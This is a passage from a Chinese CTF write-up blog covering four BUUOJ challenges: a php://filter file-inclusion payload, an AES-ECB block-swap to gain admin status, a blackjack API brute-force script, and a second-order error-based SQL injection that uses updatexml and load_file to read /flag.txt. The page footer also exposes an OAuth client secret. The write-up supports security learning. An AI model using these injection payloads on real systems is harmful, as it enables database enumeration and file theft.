<h1 id="BSidesCF-2020-Had-a-bad-day"><a href="#BSidesCF-2020-Had-a-bad-day" class="headerlink" title="[BSidesCF 2020]Had a bad day"></a>[BSidesCF 2020]Had a bad day</h1><ul>
<li>文件包含,php://filter 是可以嵌套目录在resource之前的</li>
</ul>
<p>payload: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?category&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;woofers&#x2F;resource&#x3D;flag</span><br></pre></td></tr></table></figure>



<h1 id="BSidesCF-2019-Mixer"><a href="#BSidesCF-2019-Mixer" class="headerlink" title="[BSidesCF 2019]Mixer"></a>[BSidesCF 2019]Mixer</h1><ul>
<li>AES-ECB 整块替换</li>
</ul>
<p><a target="_blank" rel="noopener" href="https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/ecb-zh/">https://ctf-wiki.github.io/ctf-wiki/crypto/blockcipher/mode/ecb-zh/</a></p>
<p><a target="_blank" rel="noopener" href="https://cjm00n.top/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html">https://cjm00n.top/CTF/Buu%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%953.html</a>\</p>
<p><a target="_blank" rel="noopener" href="https://guokeya.github.io/post/9q5WhONzV/">https://guokeya.github.io/post/9q5WhONzV/</a></p>
<p>题目要求说, 让<code>is_admin</code> 为1就行了</p>
<p>ECB 加密是<strong>16位一组</strong>,每组相互独立, 加密后为32位, 在JSON 中<code>1.0 = 1</code> </p>
<p>如果刚好构造16位, 也就是<code>1.0000000000000</code> 使得这个块独立加密.然后 再放到<code>is_admin</code>中, 就成功了</p>
<p>json: <code>&#123;&quot;first_name&quot;:&quot;&quot;,&quot;last_name&quot;:&quot;&quot;,&quot;is_admin&quot;:&#125;</code></p>
<p>而前面的 <code>&#123;&quot;first_name&quot;:&quot;</code> 刚好15位, 加上一位变成16位</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A1.00000000000000&quot;,&quot;last_name&quot;:&quot;&quot;,&quot;is_admin&quot;:&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;first_name&quot;:&quot;A</span><br><span class="line">第一个块</span><br><span class="line">1.00000000000000</span><br><span class="line">第二个块</span><br><span class="line">&quot;,&quot;last_name&quot;:&quot;1</span><br><span class="line">第三个块</span><br><span class="line">231&quot;,&quot;is_admin&quot;:</span><br><span class="line">第四个块</span><br><span class="line">0&#125;</span><br><span class="line">第五个块</span><br></pre></td></tr></table></figure>



<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b&#x3D;a[0:128]+a[32:64]+a[128:]</span><br><span class="line">a[0:128]代表数据的前第四个块。</span><br><span class="line">a[32:64]是1.000000的密文</span><br><span class="line">a[128:]是0&#125;的密文。附在最后</span><br></pre></td></tr></table></figure>



<h1 id="BSidesCF-2020-Cards"><a href="#BSidesCF-2020-Cards" class="headerlink" title="[BSidesCF 2020]Cards"></a>[BSidesCF 2020]Cards</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">start = <span class="string">&#x27;http://99adecb6-ba44-47f9-9c13-36121d77ff9c.node3.buuoj.cn/api&#x27;</span></span><br><span class="line"></span><br><span class="line">deal = start + <span class="string">&quot;/deal&quot;</span></span><br><span class="line">proxy = &#123;<span class="string">&quot;https&quot;</span>: <span class="string">&quot;http://127.0.0.1:7890/&quot;</span>&#125;</span><br><span class="line">state = requests.post(start, proxies=proxy).json()[<span class="string">&quot;SecretState&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r = requests.post(deal, json=&#123;<span class="string">&quot;Bet&quot;</span>: <span class="number">500</span>, <span class="string">&quot;SecretState&quot;</span>: state&#125;, proxies=proxy).json()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;GameState&#x27;</span>] == <span class="string">&#x27;Blackjack&#x27;</span>:</span><br><span class="line">            state = r[<span class="string">&#x27;SecretState&#x27;</span>]</span><br><span class="line">            print(r[<span class="string">&#x27;Balance&#x27;</span>])</span><br><span class="line">        <span class="keyword">if</span> r[<span class="string">&#x27;Balance&#x27;</span>] &gt; <span class="number">10000</span>:</span><br><span class="line">            print(r)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>我没跑出来…</p>
<h1 id="CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web5]CyberPunk"></a>[CISCN2019 华北赛区 Day1 Web5]CyberPunk</h1><ul>
<li>php://filter 伪协议读取源代码</li>
<li>address 处理不严谨, 导致了sql注入</li>
<li>sql注入我还是太菜了 … 以后交给队友吧 哈哈哈</li>
</ul>
<p>漏洞点: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;<span class="keyword">update</span> <span class="string">`user`</span> <span class="keyword">set</span> <span class="string">`address`</span>=<span class="string">&#x27;&quot;.$address.&quot;&#x27;</span>, <span class="string">`old_address`</span>=<span class="string">&#x27;&quot;.$row[&#x27;</span>address<span class="string">&#x27;].&quot;&#x27;</span> <span class="keyword">where</span> <span class="string">`user_id`</span>=<span class="string">&quot;.$row[&#x27;user_id&#x27;];</span></span><br></pre></td></tr></table></figure>

<p>利用方式:</p>
<p>直接注册的时候在地址上写入payload, 然后修改地址, 修改的时候随便输入即可调用payload进行<strong>报错注入</strong></p>
<p>查数据库: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">database</span>(),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>为 ctfuser,… 这个在config.php中就有</p>
<p>查表: </p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(table_name,<span class="number">1</span>,<span class="number">20</span>)<span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">&#x27;ctfusers&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>为 users</p>
<p>查字段</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">group_concat</span>(column_name),<span class="number">1</span>,<span class="number">20</span>)<span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">&#x27;user&#x27;</span>),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<p>Host,User,Password,S 继续查后20位得到 Select_priv,Insert_priv,Update_</p>
<p>没有flag</p>
<p>采用 load_file 来读取flag.txt ,</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">1</span>,<span class="number">20</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(<span class="keyword">select</span> <span class="keyword">substr</span>(<span class="keyword">load_file</span>(<span class="string">&#x27;/flag.txt&#x27;</span>),<span class="number">20</span>,<span class="number">40</span>)),<span class="number">0x7e</span>),<span class="number">1</span>)<span class="comment">#</span></span><br></pre></td></tr></table></figure>

</div></article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="mailto:undefined">m0nk3y</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://hack-for.fun/3962.html">https://hack-for.fun/3962.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="post-meta__tag-list"></div><div class="social-share pull-right" data-disabled="google,facebook"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js@1.0.16/dist/js/social-share.min.js"></script><nav id="pagination"><div class="prev-post pull-left"><a href="/21e1.html"><i class="fa fa-chevron-left">  </i><span>一文小总结中间件漏洞</span></a></div><div class="next-post pull-right"><a href="/72e3.html"><span>SUCTF 2019 EasyWeb</span><i class="fa fa-chevron-right"></i></a></div></nav><div id="gitalk-container"></div><script>var gitalk = new Gitalk({
  clientID: '6ceed9c245da8d33222a',
  clientSecret: '143c0add0301972b963c8f672bf4e58a092673fb',
  repo: 'Gitalk',
  owner: 'ifonly-go2019',
  admin: 'ifonly-go2019',
  id: md5(decodeURI(location.pathname)),
  language: 'zh-CN'
})
gitalk.render('gitalk-container')</script></div></div><footer class="footer-bg" style="background-image: url(https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200825211012.jpg)"><div class="layout" id="footer"><div class="copyright">&copy;2019 - 2021 By m0nk3y</div><div class="framework-info"><span>Driven - </span><a target="_blank" rel="noopener" href="http://hexo.io"><span>Hexo</span></a><span class="footer-separator">|</span><span>Theme - </span><a target="_blank" rel="noopener" href="https://github.com/Molunerfinn/hexo-theme-melody"><span>Melody</span></a></div><div class="busuanzi"><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><span id="busuanzi_container_page_pv"><i class="fa fa-file"></i><span id="busuanzi_value_page_pv"></span><span></span></span></div></div></footer><i class="fa fa-arrow-up" id="go-up" aria-hidden="true"></i><script src="https://cdn.jsdelivr.net/npm/animejs@latest/anime.min.js"></script><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@latest/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-ui-pack@latest/velocity.ui.min.js"></script><script src="/js/utils.js?version=1.9.0"></script><script src="/js/fancybox.js?version=1.9.0"></script><script src="/js/sidebar.js?version=1.9.0"></script><script src="/js/copy.js?version=1.9.0"></script><script src="/js/fireworks.js?version=1.9.0"></script><script src="/js/transition.js?version=1.9.0"></script><script src="/js/scroll.js?version=1.9.0"></script><script src="/js/head.js?version=1.9.0"></script><script>if(/Android|webOS|iPhone|iPod|iPad|BlackBerry/i.test(navigator.userAgent)) {
  $('#nav').addClass('is-mobile')
  $('footer').addClass('is-mobile')
  $('#top-container').addClass('is-mobile')
}</script></body></html>